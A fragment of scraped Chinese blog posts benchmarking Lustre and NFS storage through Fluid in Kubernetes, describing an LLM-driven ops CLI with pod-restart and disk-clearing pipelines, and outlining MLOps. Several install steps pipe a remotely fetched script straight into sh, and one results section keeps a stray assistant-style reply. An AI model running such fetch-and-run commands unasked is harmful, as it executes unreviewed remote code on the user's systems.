上申请的 FSx for Lustre 规格。\n4.1 直接挂载在主机上顺序读测试 安装 lustre-client 1 2 3 wget -O - https://fsx-lustre-client-repo-public-keys.s3.amazonaws.com/fsx-ubuntu-public-key.asc | gpg --dearmor | sudo tee /usr/share/keyrings/fsx-ubuntu-public-key.gpg \u0026gt;/dev/null bash -c \u0026#39;echo \u0026#34;deb [signed-by=/usr/share/keyrings/fsx-ubuntu-public-key.gpg] https://fsx-lustre-client-repo.s3.amazonaws.com/ubuntu focal main\u0026#34; \u0026gt; /etc/apt/sources.list.d/fsxlustreclientrepo.list \u0026amp;\u0026amp; apt-get update\u0026#39; apt install -y linux-aws lustre-client-modules-$(uname -r) 注意需要执行 sudo reboot 重启下机器。\n参考文档 https://docs.aws.amazon.com/zh_cn/fsx/latest/LustreGuide/install-lustre-client.html\n执行测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 fio -direct=1 -iodepth=32 -rw=read -ioengine=libaio -bs=4m -size=10g -numjobs=1 -runtime=1000 -group_reporting -filename=testfile --allow_mounted_write=1 -name=Sequ_Read_Testing Sequ_Read_Testing: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32 fio-3.16 Starting 1 process Jobs: 1 (f=1): [R(1)][96.7%][r=368MiB/s][r=92 IOPS][eta 00m:01s] Sequ_Read_Testing: (groupid=0, jobs=1): err= 0: pid=74694: Thu May 16 18:40:31 2024 read: IOPS=86, BW=347MiB/s (364MB/s)(10.0GiB/29479msec) slat (msec): min=7, max=260, avg=11.51, stdev=14.19 clat (usec): min=17, max=2646.5k, avg=344495.25, stdev=192586.04 lat (msec): min=11, max=2655, avg=356.01, stdev=197.77 clat percentiles (msec): | 1.00th=[ 284], 5.00th=[ 305], 10.00th=[ 309], 20.00th=[ 313], | 30.00th=[ 326], 40.00th=[ 330], 50.00th=[ 334], 60.00th=[ 334], | 70.00th=[ 338], 80.00th=[ 338], 90.00th=[ 342], 95.00th=[ 347], | 99.00th=[ 435], 99.50th=[ 2601], 99.90th=[ 2635], 99.95th=[ 2635], | 99.99th=[ 2635] bw ( KiB/s): min=303104, max=417792, per=100.00%, avg=384223.08, stdev=21823.92, samples=53 iops : min= 74, max= 102, avg=93.77, stdev= 5.35, samples=53 lat (usec) : 20=0.04% lat (msec) : 20=0.04%, 50=0.12%, 100=0.16%, 250=0.55%, 500=98.16% lat (msec) : 750=0.08%, 1000=0.04%, 2000=0.16%, \u0026gt;=2000=0.66% cpu : usr=0.04%, sys=6.67%, ctx=2614, majf=0, minf=32779 IO depths : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, \u0026gt;=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, \u0026gt;=64=0.0% issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=32 Run status group 0 (all jobs): READ: bw=347MiB/s (364MB/s), 347MiB/s-347MiB/s (364MB/s-364MB/s), io=10.0GiB (10.7GB), run=29479-29479msec 4.2 在 Pod 中顺序读测试 进入 Pod 1 2 3 kubectl exec -it lustre-demo bash cd /data 执行测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 fio -direct=1 -iodepth=32 -rw=read -ioengine=libaio -bs=4m -size=10g -numjobs=1 -runtime=1000 -group_reporting -filename=testfile --allow_mounted_write=1 -name=Sequ_Read_Testing Sequ_Read_TestingA: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32 fio-3.16 Starting 1 process Jobs: 1 (f=1): [R(1)][100.0%][r=364MiB/s][r=91 IOPS][eta 00m:00s] Sequ_Read_TestingA: (groupid=0, jobs=1): err= 0: pid=563: Thu May 16 18:11:28 2024 read: IOPS=78, BW=315MiB/s (330MB/s)(10.0GiB/32490msec) slat (msec): min=7, max=261, avg=12.69, stdev=21.49 clat (usec): min=3, max=5356.2k, avg=357490.74, stdev=319869.00 lat (msec): min=10, max=5386, avg=370.18, stdev=334.81 clat percentiles (msec): | 1.00th=[ 288], 5.00th=[ 309], 10.00th=[ 313], 20.00th=[ 317], | 30.00th=[ 326], 40.00th=[ 334], 50.00th=[ 334], 60.00th=[ 338], | 70.00th=[ 342], 80.00th=[ 347], 90.00th=[ 347], 95.00th=[ 351], | 99.00th=[ 355], 99.50th=[ 3171], 99.90th=[ 5336], 99.95th=[ 5336], | 99.99th=[ 5336] bw ( KiB/s): min=98304, max=417792, per=100.00%, avg=376955.83, stdev=41482.14, samples=54 iops : min= 24, max= 102, avg=92.00, stdev=10.13, samples=54 lat (usec) : 4=0.04% lat (msec) : 20=0.04%, 50=0.12%, 100=0.16%, 250=0.51%, 500=98.24% lat (msec) : 750=0.04%, 1000=0.04%, 2000=0.16%, \u0026gt;=2000=0.66% cpu : usr=0.05%, sys=6.02%, ctx=2757, majf=0, minf=32780 IO depths : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, \u0026gt;=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, \u0026gt;=64=0.0% issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=32 Run status group 0 (all jobs): READ: bw=315MiB/s (330MB/s), 315MiB/s-315MiB/s (330MB/s-330MB/s), io=10.0GiB (10.7GB), run=32490-32490msec Fluid 中，ThinRuntime 的 PVC 性能与主机直接挂载的性能，不会损失很多。这里需要注意，blocksize 和 size 的大小会严重影响测试的结果。如果只读取 1g 的数据，顺序读的性能可以达到 500+ MB/s; 如果 blocksize 为 128k，顺序读的性能又只有 100+ MB/s。因此，需要根据使用场景进行调整，才能准确评估。\n5. 总结 最近国内的模型推理服务需要在海外进行部署，我们选定了 AWS FSx for Lustre 作为存储后端，但为了保持业务层使用存储逻辑的一致性，需要将 Lustre 对接到 Fluid 中。\n国内的模型上传到 S3 之后，自动同步到 Lustre 中。\nFluid 早期版本就支持 Lustre，但 Fluid 社区中并没有提供详细的文档描述和 Demo 示例，因此本篇主要记录了使用 Fluid 的 ThinRuntime 对接 Lustre 的实践过程。\n由于我们仅用来存储推理模型，模型数据通常都是大文件，因此在性能测试方面仅测试了顺序读的速度。在我们选的规格下，PVC 中的速度能达到 300+ MB/s。\n","description":"","id":53,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data","Lustre"],"title":"Fluid 使用 Lustre Runtime 以及性能测试","uri":"https://www.chenshaowen.com/blog/fluid-using-lustre-runtime-and-performance-testing.html"},{"content":"1. 创建 Dataset 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: nfs-demo spec: mounts: - mountPoint: x.x.x.x:/x-x/ name: nfs-demo EOF 2. 创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntimeProfile metadata: name: nfs spec: fileSystemType: nfs fuse: image: fluidcloudnative/nfs imageTag: v0.1 imagePullPolicy: IfNotPresent command: - \u0026#34;/usr/local/bin/entrypoint.sh\u0026#34; EOF 1 2 3 4 5 6 7 8 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntime metadata: name: nfs-demo spec: profileName: nfs EOF 3. 创建测试 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: nfs-demo spec: containers: - name: nfs-demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: nfs-demo volumes: - name: nfs-demo persistentVolumeClaim: claimName: nfs-demo EOF 4. 性能测试 4.1 测试工具 安装 Opscli 工具 1 curl -sfL https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh | VERSION=latest sh - 测试命令 1 opscli task --filepath ~/.ops/tasks/get-diskio-byfio.yaml --filename ./testfile --size 10g -i 127.0.0.1 4.2 三种 nfs 挂载方式 Direct 直接挂载到主机目录 1 mount -t nfs x.x.x.x:/x-x/ /data/ 使用 CSI-Driver-NFS 提供 NFS 存储 参考 https://github.com/kubernetes-csi/csi-driver-nfs\n使用 Fluid NFS Runtime 提供 NFS 存储 4.3 测试结果 - 10 GB 数据 Random Read Testing (随机读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 28.0k 113 90469 10 CSI NFS Pod 3115 12.2 841368 10 Fluid NFS Pod 28.2k 110 93052 10 Random Write Testing (随机写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 28.6k 112 91775 10 CSI NFS Pod 3217 12.6 814718 10 Fluid NFS Pod 29.2k 114 89678 10 Sequential Read Testing (顺序读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 3029 379 27043 10 CSI NFS Pod 1150 144 71226 10 Fluid NFS Pod 2606 326 31428 10 Sequential Write Testing (顺序写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 3092 387 26489 10 CSI NFS Pod 1154 144 70946 10 Fluid NFS Pod 2300 288 35605 10 Random Read IOPS Testing (随机读取 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 10.5k 40.0 249817 10 CSI NFS Pod 3107 12.1 843484 10 Fluid NFS Pod 9202 35.9 284852 10 Random Write IOPS Testing (随机写入 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (GiB) Direct 14.2k 55.6 184205 10 CSI NFS Pod 3148 12.3 832589 10 Fluid NFS Pod 12.0k 50.6 202321 10 4.4 测试结果 - 1 GB 数据 Random Read Testing (随机读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 27.2k 106 9648 1024 CSI NFS Pod 20.3k 79.4 12901 1024 Fluid NFS Pod 36.1k 141 7255 1024 Random Write Testing (随机写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 27.6k 108 9489 1024 CSI NFS Pod 28.3k 110 9275 1024 Fluid NFS Pod 20.5k 80.3 12759 1024 Sequential Read Testing (顺序读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 4291 536 1909 1024 CSI NFS Pod 1125 141 7280 1024 Fluid NFS Pod 4662 583 1757 1024 Sequential Write Testing (顺序写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 4689 586 1747 1024 CSI NFS Pod 1161 145 7052 1024 Fluid NFS Pod 3803 475 2154 1024 Random Read IOPS Testing (随机读取 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 15.5k 60.7 16871 1024 CSI NFS Pod 14.4k 56.3 18195 1024 Fluid NFS Pod 15.0k 58.8 17419 1024 Random Write IOPS Testing (随机写入 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 13.1k 51.1 20020 1024 CSI NFS Pod 15.0k 62.4 16423 1024 Fluid NFS Pod 13.2k 51.5 19875 1024 4.5 测试结果 - 100 MB 数据 好的，我将按照您提供的格式整理全部的测试案例。\nRand_Read_Testing (随机读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 14.3k 55.7 1794 100 CSI NFS Pod 28.1k 110 912 100 Fluid NFS Pod 37.0k 145 691 100 Rand_Write_Testing (随机写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 26.5k 104 966 100 CSI NFS Pod 29.4k 115 872 100 Fluid NFS Pod 9052 35.4 2828 100 Sequ_Read_Testing (顺序读取测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 3603 450 222 100 CSI NFS Pod 1568 196 510 100 Fluid NFS Pod 6779 847 118 100 Sequ_Write_Testing (顺序写入测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 6666 833 120 100 CSI NFS Pod 6349 794 126 100 Fluid NFS Pod 6451 806 124 100 Rand_Read_IOPS_Testing (随机读取 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 15.4k 60.0 1666 100 CSI NFS Pod 14.6k 56.8 1759 100 Fluid NFS Pod 15.4k 60.2 1660 100 Rand_Write_IOPS_Testing (随机写入 IOPS 测试) 测试环境 IOPS 带宽 (MiB/s) 用时 (msec) 数据大小 (MiB) Direct 13.5k 52.6 1900 100 CSI NFS Pod 15.8k 61.9 1616 100 Fluid NFS Pod 13.2k 51.4 1944 100 Rand_Read_Latency_Testing (随机读取延迟测试) 测试环境 IOPS 带宽 (kB/s) 用时 (msec) 数据大小 (MiB) Direct 496 1985 51594 100 CSI NFS Pod 579 2319 44159 100 Fluid NFS Pod 458 1833 55868 100 Rand_Write_Latency_Testing (随机写入延迟测试) 测试环境 IOPS 带宽 (kB/s) 用时 (msec) 数据大小 (MiB) Direct 458 1836 55785 100 CSI NFS Pod 575 2301 44495 100 Fluid NFS Pod 444 1776 57651 100 4.5 结论 Direct 直接挂载 NFS 的方式性能是最好的，但在 Kubernetes 下只能用 HostPath 挂载，不便于使用。\nCSI NFS Pod 对于小文件的读写能力很好，适合存储代码等场景，但相较于其他方式优势并不明显。\nFluid NFS Pod Fluid Runtime 提供的 NFS 性能与 Direct 直接挂载的方式性能相差不大，原因在于 Fuse Pod 的原理就是挂载 NFS 目录到当前主机目录。\n","description":"","id":54,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data"],"title":"Fluid 使用 NFS Runtime 以及性能测试","uri":"https://www.chenshaowen.com/blog/fluid-using-nfs-runtime-and-performance-testing.html"},{"content":"1. 让 Ops Copilot 成为 Ops Coilot 在 2023 年 09 月，我写过一版 Ops Copilot，也有文章发出 我在给 Ops 工具写 Copilot\n。\n实现的效果是这样的：\n1 2 3 4 5 6 7 8 9 10 Opscli\u0026gt; 打开浏览器 Open a browser and navigate to \u0026#39;https://www.google.com\u0026#39;. ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ import webbrowser webbrowser.open(\u0026#39;https://www.google.com\u0026#39;) ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ Can I run this code? (y/n) y 此时，本地默认的浏览器就会被打开。\n1 2 3 4 5 6 7 8 9 10 Opscli\u0026gt; 获取 K8s 节点信息 Retrieve information about Kubernetes nodes ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ kubectl get nodes ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ Can I run this code? (y/n) \u0026gt; y NAME STATUS ROLES AGE VERSION node1 Ready control-plane,master,worker 407d v1.21.0 但这样的功能对 Ops 项目来说，并没有什么意义，有很多开源项目也能提供这样的能力。\n在交互对话的过程中，Ops Copilot 完全忽略了 Ops 提供的能力。这就是症结所在，我停顿了一段时间没有更新 Copilot 相关的功能。\nOps Copilot 最近一次的迭代需求来自工作岗位的生产需求，解决各种 AI 基础设施的异常问题。思路来自于，服务化的 AI Agent 和流水线化的 AI 任务。\n下面一起看看这次迭代的若干关键点吧。\n2. Ops Copilot 的设计 Ops Copilot 是借助于 LLM 整合 Ops 能力的一个 CLI 子命令。主要想解决以下问题:\n如何选择合适的 Task 解决问题 如何提取执行相关 Task 的参数 下面是 Ops Copilot 的处理逻辑:\n通过 Pipeline 的定义描述场景，借助 LLM 将文本输入转换为执行某一个 Pipeline，并提取相关参数。\nOps Copilot 会解析 Pipeline 并执行 Task 任务。Ops Copilot 通过 Ops Server 与 Ops Controller 交互，创建 TaskRun 任务等待 Ops Controller 执行完成，并获取结果。\nOps Server 是 2024 年初给 Ops 新增 UI 迭代时更新的组件，提供有鉴权能力，能够创建 Task 执行实例 TaskRun。\nOps Controller 会 Watch TaskRun 的创建，根据其中指定的 Cluster 或者 Host 对象，拿到相关的凭证连接 Ops Obsject 对象，执行相关操作。\n而对 Cluster 和 Hosts 对象的操作，脚本执行、文件分发，正是 Ops 项目的核心设计。\n按照这样的思路，Ops Copilot 才是真正基于 Ops 项目构建的子命令，融入到 Ops 项目中，如下图。\n3. Ops Copilot 使用 3.1 参数说明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /usr/local/bin/opscli copilot --help use llm to assist ops Usage: opscli copilot [flags] Flags: -e, --endpoint string e.g. https://api.openai.com/v1 -h, --help help for copilot --history int (default 5) -k, --key string e.g. sk-xxx -m, --model string e.g. gpt-3.5-turbo -s, --silence -v, --verbose string copilot 会默认从环境变量获取 OPENAI_API_HOST、OPENAI_API_BASE、OPENAI_API_MODEL、OPENAI_API_KEY、OPS_SERVER, OPS_TOKEN，如果环境变量不存在，则使用默认值。\n3.2 安装 如果之前已经安装，需要执行 opscli upgrade 以升级到最新版本。\n国内使用 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 国外使用 1 curl -sfL https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh | VERSION=latest sh - 3.3 使用 设置环境变量 1 2 3 4 export OPENAI_API_KEY=sk-xxxx export OPENAI_API_HOST=https://llmapi.YOUR-OPENAI-SERVER.com/v1 export OPS_SERVER=http://1.1.1.1 export OPS_TOKEN=xxxx 运行 Copilot 1 2 3 4 /usr/local/bin/opscli copilot Welcome to Opscli Copilot. Please type \u0026#34;exit\u0026#34; or \u0026#34;q\u0026#34; to quit. Opscli\u0026gt; 查看支持哪些操作 1 2 3 4 5 6 7 8 9 10 11 12 Opscli\u0026gt; 有哪些可用的操作 这里列出了可用的操作及其相应的描述和变量： 1. list-cluster：查询K8s集群列表。 2. list-task：查询任务列表。 3. list-pipeline：查询流水线列表。 4. restart-pod：重新启动或删除Pod。变量：podname（一个或多个Pod名称）。 5. force-restart-pod：强制重新启动或删除Pod。变量：podname（一个或多个Pod名称）。 6. get-cluster-ip：查询集群的IP地址。变量：clusterip（一个或多个集群IP地址）。 7. clear-disk：清空磁盘。变量：nodeName（一个或多个节点名称）。 您可以根据具体需求选择合适的操作来执行相应的操作。 这些流水线定义在 https://github.com/shaowenchen/ops/blob/main/pkg/copilot/pipelines.go 中。希望后面能有一种更好的扩展机制，比如从 Ops 部署的集群自动发现。\n查询有哪些集群 1 2 3 4 5 6 Opscli\u0026gt; 有哪些集群 这些集群如下： 1. ops-system/xx-xx：该集群部署在xxx云上的推理集群 2. ops-system/xx-xx：该集群部署在xxx上的集群 3. ops-system/xx-xx：该集群部署在xxx上的训推一体集群 4. ops-system/xx-xx：该集群部署在xx上的 NPU 训练集群 Ops Copilot 会定时从 Ops 部署的集群上拉取集群列表、主机列表的数据。\n重启一个 Pod 1 2 3 4 5 6 7 8 9 10 11 12 Opscli\u0026gt; 强制重启训推一体集群上的pod ubuntu-8474647969-qszcj 强制重启训推一体集群上的pod ubuntu-8474647969-qszcj - 步骤：检查pod是否存在 - 输出： 在默认命名空间中找到了Pod ubuntu-8474647969-qszcj。 - 步骤：删除pod - 输出： 警告：立即删除不会等待确认正在运行的资源是否已终止。该资源可能会无限期地在集群上运行。 Pod \u0026#34;ubuntu-8474647969-qszcj\u0026#34; 已被强制删除。 在集群上可以看到相关 Pod 的状态更新。\n1 2 3 4 5 kubectl get pod ubuntu-8474647969-qszcj -w NAME READY STATUS RESTARTS AGE ubuntu-8474647969-qszcj 1/1 Running 0 20h ubuntu-8474647969-qszcj 1/1 Terminating 0 20h ubuntu-8474647969-qszcj 1/1 Terminating 0 20h 一个流水线通常会包含若干 Task 任务。这些 Task 有两个来源:\nOps Copilot 从 Ops 部署的集群定时获取到的 Task 任务，这部分在 Ops 的 Github 仓库下有很多 硬编码的 Task 任务，https://github.com/shaowenchen/ops/blob/main/pkg/copilot/tasks.go ，允许扩展和 Ops 无关的 Task 任务，比如 summary 使用 LLM 对输出进行总结、allow-whitelist 对操作员白名单进行控制等 4. 对齐是关键 4.1 场景意图的对齐 由于职业经历，我落地过 Gitlab CI，开发过 Github Action 插件，迭代过基于 Jenkins 的项目，从 0 到 1 分别开发过基于 Tekton 和 Argo Workflow 的项目。因此，在遇到需要设计执行逻辑时，我潜意识就选择了使用任务组装流水线的方式来执行 AI 任务。\n下面是一个流水线定义:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 var pipelineListPipeline = agent.LLMPipeline{ Desc: \u0026#34;Query - list pipeline\u0026#34;, Namespace: \u0026#34;ops-system\u0026#34;, Name: \u0026#34;list-pipeline\u0026#34;, NodeName: \u0026#34;anymaster\u0026#34;, LLMTasks: []agent.LLMTask{ { Name: \u0026#34;list-pipelines\u0026#34;, }, { Name: \u0026#34;summary\u0026#34;, }, }, } Desc，让 LLM 知道这个 Pipeline 的作用是什么 LLMTasks，包含 Pipeline 执行的具体逻辑 还有一些默认值或者配置，这些都是为了让 LLM 能够准确对输入进行匹配，又将 LLM 约束在我们定义的规则之内。\nDesc 将每条流水线的用途准确提供给 LLM，LLM 根据输入的文本，选择执行哪条 Pipeline 来解决文本描述的问题，而这个 Pipeline 具体执行什么 Task 却是我们来解决的。\n4.2 变量提取的对齐 提取变量是另外一个关键点，请看下面的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var pipelineRestartPod = agent.LLMPipeline{ Desc: \u0026#34;Restart - Restart、delete Pod\u0026#34;, Namespace: \u0026#34;ops-system\u0026#34;, Name: \u0026#34;restart-pod\u0026#34;, NodeName: \u0026#34;anymaster\u0026#34;, Variables: []agent.VariablePair{ { Key: \u0026#34;podname\u0026#34;, Desc: \u0026#34;For example, `pod: long-v1-64cf8d5478-5zsvk or name: long-v1-64cf8d5478-5zsvk`, where long-v1-64cf8d5478-5zsvk is podname\u0026#34;, Required: true, }, }, LLMTasks: []agent.LLMTask{ { Name: \u0026#34;check-pod-existed\u0026#34;, }, { Name: \u0026#34;delete-pod\u0026#34;, }, { Name: \u0026#34;summary\u0026#34;, }, }, } 有两种方式可以有效提取变量:\n使用正则匹配 举例说明 上面的例子中，通过给出 podname 的真实示例，可以帮助 LLM 从输出的文本信息中提取流水线需要的变量。\n5. 事件驱动的 AI Agent 前面的文章中我提到过，Copilot 是人驱动，人负责的；AI Agent 是程序自行驱动，程序负责的。\n通过上面的对齐方式，其实不仅限于运维领域，在其他领域也可以基于流水线化的 AI 任务来快速对齐 LLM 实现 Copilot 的功能。难点在于，你需要实现该领域的 Ops Server、Ops Controller 类似的领域抽象和组件能力。这不是一件容易的事情。\n之前开发 Ops 的契机来自于工作需求，我需要维护很多机器、集群，批量进行运维和配置。受益于团队的包容，我能边开发 Ops 项目，边进行大量运维任务的尝试，最终 Ops 逐步稳定下来，在生产中得以应用。在迭代的过程中，因为 Ops 项目的 Bug 差点搞出事故，这部分我在博文中也有所记录，之后我就愈加谨慎对待 Ops 的更新。\n回到 AI Agent，现在也有一个基于工作岗位上的生产需求，自动处理线上的 AI 基础设施故障。\n实际上，Copilot 与 AI Agent 只有一墙之隔，无非就是转被动为主动，用程序代替人驱动 Copilot。\n如上图，Copilot 是基于人的输出来触发，分析人的输出，执行任务，将结果反馈给人。但人的输出是从哪里来的呢？主要有两种:\n从 0 到 1，原始需求发起方 自主原创的部分，比如我要创建一个命名空间 Namespace。那么这个想法，会被记录在哪里，这个记录的源头，能不能作为一个事件源，自动的触发 Copilot 执行创建命名空间的任务。\n从 1 到 1，从其他地方拷贝的 从其他地方拷贝的部分，比如一条告警信息，能不能产生一个事件，通知给人，得到确认和授权之后，交给 Copilot 执行。\n围绕生产的活动，都可以将其以事件化的形式转给 Copilot，这就是事件驱动的 AI Agent 开发思路。\n当然这部分，我也是在实践的早期，因为通过 Ops 也可以做巡检任务。\n如上图所示，巡检任务会定时执行，当发现异常时就会产生事件，发送通知，如果将这个事件直接发送给 Copilot，并且 Copilot 已经集成了这种事件的处理方式，那么这个异常就能直接借助 LLM 解决掉，实现对故障处理的完全接管。\n6. 总结 本篇主要内容如下：\nOps Copilot 的重新设计 对 Ops Copilot 进行了重新设计，使其更深入地与 Ops 项目整合，利用大型语言模型（LLM）来增强运维任务的自动化。\n流水线化的 AI 任务 通过将 AI 任务流水线化，借鉴在不同 CI/CD 工具和工作流项目中的经验，在 Ops Copilot 中实现了任务的组装和执行。\n事件驱动的 AI Agent 将人类操作转化为程序驱动的事件，可以促进 Copilot 向 AI Agent 的演进，实现程序对环境的完全接管。\n","description":"","id":55,"section":"post","tags":["博文","AI","Copilot","Agent","LLM"],"title":"对齐 Ops，使用新思路重写 Ops Copilot 已更新","uri":"https://www.chenshaowen.com/blog/ops-copilot-has-been-updated-using-pipeline-and-llm.html"},{"content":"1. 什么是 MLOps MLOps 是 Machine Learning Operations 的缩写，描述的是围绕模型研发整个生命周期过程的标准化和工程化。\nMLOps 包括以下几个关键步骤:\n数据管理，数据的存储、访问、清洗、转换 模型开发，算法开发、模型构建 模型训练与调优，使用数据训练模型，调整超参数优化模型，微调模型 模型评估，测试模型的准确性、泛化能力、性能指标 模型部署，将模型部署到预期环境，转换模型 模型监控，监控模型的表现，性能退化、数据漂移、健壮性 另一个类似的概念是 ModelOps。ModelOps 涵盖的范围更广，不仅仅包含 MLOps 所关注的机器学习模型，而是所有人工智能领域的模型。\n2. MLOps 的收益 2.1 提升模型研发效率 自动化工具，加快模型的训练、部署、评估等过程 促进协作，提高团队的工作效率 2.2 提高一致性 通过版本控制，确保数据、模型参数、实验等每一步都可以被追踪 标准化流程，减少人工操作带来的不一致性 环境管理，保障各种环境的可复现、可交付 2.3 促进分工协作 明确职责，算法、数据、运维工程师各自负责自己的工作 专业化分工，不同协作 3. MLOps 的核心问题 缩短模型研发的迭代周期 很多公司上线一个模型需要较长时间，通常达到 1 - 3 个月 。MLOps 希望通过标准化、自动化的流程来加速这个过程。\n各个角色之间无缝协作 模型的开发过程，涉及业务、数据、算法、运维等多种角色。MLOps 希望能够构建模型研发过程中各个角色之间协作的统一平台。\n4. DevOps VS MLOps DevOps MLOps 关注点 软件开发和 IT 运维 机器学习模型的开发、部署和运维 团队组成 软件工程师和 IT 运维人员 数据科学家、机器学习工程师和 IT 运维人员 开发任务 编写新功能代码或修复现有 bug 构建和训练机器学习模型，进行实验性探索 测试范围 执行单元和集成测试，关注代码质量 除常规测试外，还需验证数据和模型质量 部署过程 部署代码和应用程序 部署机器学习流水线，自动重新训练和部署模型 生产环境 监控应用程序和生产环境的错误和性能 监控模型性能，跟踪数据变化和模型衰退 持续集成 (CI) 测试和验证代码及组件 测试和验证数据、数据架构和模型 持续交付 (CD) 部署软件包或服务 部署机器学习训练流水线，自动部署模型预测服务 持续训练 (CT) - 自动重新训练和提供模型，ML 系统特有 目标 加速软件交付和提高可靠性 提高机器学习模型的效率和可靠性 挑战 持续集成和自动化部署的挑战 模型漂移、数据偏差、模型解释能力等 5. MLOps 包含的环节 数据提取 确定所需的数据，获取原始的数据集。\n数据分析 探索数据的统计特征，比如数值范围、分布等; 检查数据质量，是否存在缺失值、异常值；识别数据特征和模式。\n数据准备 将数据拆分为训练集、验证集、测试集；对数据进行必要的预处理，比如归一化、编码等；将数据转换为模型可接受的格式。\n模型训练 选择合适的算法和模型架构，训练模型，并将训练好的模型保存下来。\n模型评估 在测试集上评估模型效果，分析模型的优缺点，与基线模型对比性能。\n模型验证 确认模型是否达到可部署的性能水平，验证模型的鲁棒性，评估模型的可解释性、公平性等质量指标。\n提供模型 将模型部署到生产环境中，对外提供 API 接口。\n模型监控 持续收集和监控模型在线服务的性能指标; 检测数据漂移，评估是否需要重新训练模型; 根据监控结果优化或者重新训练模型。\n6. MLOps 分级 6.1 级别 0：手动过程 适用场景:\n不需要频繁更新模型 特性:\n依赖手动操作 脚本驱动的交互式手动过程：数据分析、数据准备、模型训练和验证完全手动 机器学习与操作分离：数据科学家与工程师分离，训练好的模型作为工件移交给工程团队 不频繁发布迭代：新模型版本每年仅部署几次 无 CI/CD：由于更改不频繁，持续集成和持续部署被忽略 仅部署经过训练的模型作为服务，而不需要完整的机器学习平台 不跟踪或记录模型预测和操作 存在的问题:\n模型可能无法适应环境动态变化或数据的变化 需要在生产环境中主动监控模型质量 需要频繁地使用最新数据重新训练模型 需要不断尝试新的实现以生成模型 6.2 级别 1：机器学习流水线自动化 适用场景:\n自动使用新数据训练模型 持续交付模型服务 特性:\n快速实验：机器学习实验步骤编排，自动执行转换，快速迭代 自动使用新数据训练模型 在不同环境中能平滑切换 组件和流水线的模块化代码：代码模块化，组件容器化，以实现可重现性 持续交付模型：流水线自动执行模型部署步骤 要求：\n数据和模型验证：自动化数据验证和模型验证步骤 